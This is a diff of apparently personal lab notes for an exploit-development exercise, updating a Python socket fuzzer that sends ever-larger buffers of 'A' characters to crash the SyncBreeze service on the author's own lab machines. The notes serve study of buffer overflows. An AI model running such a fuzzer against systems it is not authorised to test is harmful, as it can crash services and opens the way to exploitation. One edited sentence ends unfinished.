@@ -4,7 +4,7 @@
 _(To be performed on your own Kali and Windows lab client machines - Reporting is required for these exercises)_
 
 1.  Build the fuzzer and replicate the SyncBreeze crash.
-To start we must first build a fuzzer using python. We can use the following code:
+To start we must first build a fuzzer using python. We can use the following code to gather :
 ```python
 #!/usr/bin/python
 import socket
@@ -16,7 +16,7 @@ target =
 
 while(size < 2000):
   try:
-    print "\nSending buffer with %s bytes" % size
+    print("\nSending buffer with %s bytes" % size)
     
     inputBuffer = "A" * size
     
@@ -46,7 +46,7 @@ while(size < 2000):
     time.sleep(10)
     
   except:
-    print "\nCould not connect!"
+    print("\nCould not connect!")
     sys.exit()
 ```
 
